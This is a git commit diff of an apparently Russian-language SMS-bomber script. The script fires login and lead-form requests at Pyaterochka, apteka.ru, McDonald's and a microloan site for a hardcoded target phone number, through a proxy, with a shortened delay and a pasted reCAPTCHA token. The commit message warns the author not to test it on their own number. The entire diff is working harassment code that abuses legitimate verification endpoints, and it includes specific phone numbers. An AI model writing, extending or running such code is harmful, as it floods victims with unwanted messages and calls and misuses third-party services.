708fbb249975ac232cbad7b8e5f82bbb2e44eb92
Максим <yungmakcoc@gmail.com>
2021-07-21 23:36:48 +0500

    Добавлен мак(криво) и быстроденьги(опасно для жизни, на своем номере не тестить)

--- main.py
+++ main.py
@@ -1,19 +1,17 @@
 import requests
 import time
 
+
 # print("Введи номер телефона без кода страны")
 # phone=input()
 # print("Номер телефона " + phone)
-phone = '9991253348'
-ts = 5
-ipPort = "45.80.47.205:8080"
+phone = '9519322412'
+ts = 1
+ipPort = "212.33.246.122:8080"
 proxy = {"https": "https://" + ipPort}
 headers = {
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124",
     "Content-Type": "application/json", }
-
-
-# прокси
 
 
 def pyaterka():
@@ -46,8 +44,20 @@ def aptekaru():
                         json={"phone": aptPhone, "u": "1"}, proxies=proxy)
     print(apt.status_code, "aptekaru")
     print(apt.json())
+#def bistrodengi():
+    #bisHeaders=headers
+    #bisHeaders.update({"Host":"bistrodengi.ru","Origin":"https://bistrodengi.ru","X-Requested-With":"XMLHttpRequest"})
+    #bisPhone="+7"+phone
+    #bis=requests.post("https://bistrodengi.ru/ajax/lead.php",headers=bisHeaders,json={"fio":none,"phone":bisPhone})
+def mcdonalds():
+    mcHeaders=headers
+    mcHeaders.update({"host":"site-api.mcdonalds.ru", "Origin":"https://mcdonalds.ru"})
+    mcPhone="+7"+phone
+    mc=requests.post("https://site-api.mcdonalds.ru/api/v1/user/login/phone",headers=mcHeaders, proxies=proxy,json={"number":"+79991253348","g-recaptcha-response":"03AGdBq25BqgSB9HzJmA1xZeGyo6I6_JpvzbC-a-wnYbYMRrech6-mXmImNqM6VfrpVMyFUuz1yykN2mzDXbqoz7uWlI0Y1L3AFaodQrnIjTS81mwaxWsfsohNFEdoDdIIYLW8INnBfh4h-f5u0GJN7M57xiGk_LjQqYV5s0Gi_lNBR_VxYUHleAKBFbRKZyn45UzsLU2L4hR5qpkp2Ai1UDxWugIBI4wUPO-AKU3n-5H-OZs_krT7ddVJ7rLnAvotMo10Z1TDQh-XyhY3GCeIl-Mr9c5lIctgb7VjVzcwh_ZXyJGy3kQgZ2QhORfe3VWlvzBgALSH6Wzf_v3LUXoL7pIf8ZFReMdu0m1d_-l5T0rrgZ5tK6bbMcBqa78hZ14U23oxLUviGVyLvxlrsZWqp1w4vL0oioHkJPGH3Z6dN-C8XBNi5RUxM3IV4t1Xqvci9lGB9DkRCL0-"})
+    print(mc.status_code,"McDonalds")
+    print(mc.json())
 
-time.sleep(ts)
+mcdonalds()
 time.sleep(ts)
 pyaterka()
 time.sleep(ts)
